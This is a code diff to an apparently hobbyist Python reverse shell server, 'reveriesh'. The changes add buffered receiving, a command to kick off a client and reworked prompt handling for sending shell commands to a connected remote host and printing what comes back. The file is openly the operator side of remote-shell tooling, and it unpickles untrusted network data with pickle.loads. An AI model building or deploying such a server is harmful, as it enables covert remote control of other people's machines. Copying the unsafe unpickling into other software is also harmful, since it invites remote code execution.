@@ -18,6 +18,15 @@ import time
 
 from reveriesh.common import SIG_REVERIESH, ascii_format
 
+BUFSIZE = 4096  # 4 KiB
+
+
+class ResetRun(Exception):
+    pass
+
+class KickOffClient(Exception):
+    pass
+
 
 class ReverseShellServer(object):
     def __init__(self, host="", port=80):
@@ -59,21 +68,24 @@ class ReverseShellServer(object):
             try:
                 self.run_once()
             except BrokenPipeError:
-                print(ascii_format('Broken pipe, restarting', 93))
+                print(ascii_format('Broken pipe, restarting server', 93))
             except EOFError:
-                print(ascii_format('EOF/Broken pipe, restarting', 93))
+                print(ascii_format('EOF/Broken pipe, restarting server', 93))
                 self.kill_client()
             finally:
                 print(ascii_format('...', 93))
 
     def run_once(self):
-        self.prompt()
         while True:
             try:
                 self.send_commands()
             except KeyboardInterrupt:
                 print('<!> keyboard interrupt issued. '
-                      'type "quit" to stop server')
+                      'type "quit" or Ctrl-y to stop server')
+            except KickOffClient:
+                print(ascii_format('Asked to kick off client', 93))
+                self.kill_client()
+                return
             except RuntimeError as exc:
                 print('this happened: {}'.format(exc))
                 self._err_count += 1
@@ -115,23 +127,47 @@ class ReverseShellServer(object):
         try:
             info = pickle.loads(data)
         except:
-            print(data)
-            raise
+            print('Something broke during unmarshall. raw data: '
+                  '\n{}\n______'.format(data))
+            # raise
+            return {}
         return info
 
+    def send_a_cmd(self, data):
+        # type: (bytes) -> dict
+        res = self.conn.send(data)
+        data = self.recvall()
+        try:
+            info = self.unmarshall(data)
+        except pickle.UnpicklingError:
+            print('Unable to unpickle')
+            info = {}
+        return info
+
+    def recvall(self):
+        data = b''
+        while True:
+            part = self.conn.recv(BUFSIZE)
+            data += part
+            if len(part) < BUFSIZE:
+                # either 0 or end of data
+                break
+        return data
+
     def prompt(self):
-        self.conn.send(SIG_REVERIESH.PROMPT)
-        data = self.conn.recv(1024)
-        info = self.unmarshall(data)
-        print(info['prompt'].decode(), end='')
+        info = self.send_a_cmd(SIG_REVERIESH.PROMPT)
+        prompt = info.get('prompt', b'<?>')
+        print(prompt.decode(), end='')
 
     def get_input(self):
         # todo: use readline instead
         cmd = input()
         # print(":".join("{:02x}".format(ord(c)) for c in cmd))
-        if cmd == '\x14':
+        if cmd == '\x0b':   # ctrl-k
+            raise KickOffClient
+        if cmd == '\x14':  # Ctrl-t
             pass # todo: restart call
-        if cmd == '\x19' or cmd == 'quit':
+        if cmd == '\x19' or cmd == 'quit':  # ctrl-y
             print('Asking for SIGQUIT, quitting')
             self.quit()
         if cmd == '\x1b[A':
@@ -141,23 +177,20 @@ class ReverseShellServer(object):
         return cmd
 
     def send_commands(self):
-            cmd = self.get_input()
-            if not cmd:
-                self.prompt()
-            elif len(str.encode(cmd)) > 0:
-                self.last_command = cmd
-                self.conn.send(cmd.encode())
-                data = self.conn.recv(1024)
-                info = self.unmarshall(data)
-                if info.get('err', None):
-                    print(ascii_format(info['err'].decode(), 'red'))
-                if info.get('out', None):
-                    print(info['out'].decode(), end='')
-                print(info['prompt'].decode(), end='')
-            else:
-                print('wat')
-
-
+        self.prompt()
+        cmd = self.get_input()
+        if not cmd:
+            return
+        elif len(str.encode(cmd)) > 0:
+            self.last_command = cmd
+            info = self.send_a_cmd(cmd.encode())
+            if info.get('err', None):
+                print(ascii_format(info['err'].decode(), 'red'))
+            if info.get('out', None):
+                print(info['out'].decode().strip('\n'), end='')
+            # print(info['prompt'].decode(), end='')
+        else:
+            print('wat')
 
 
 if __name__ == '__main__':
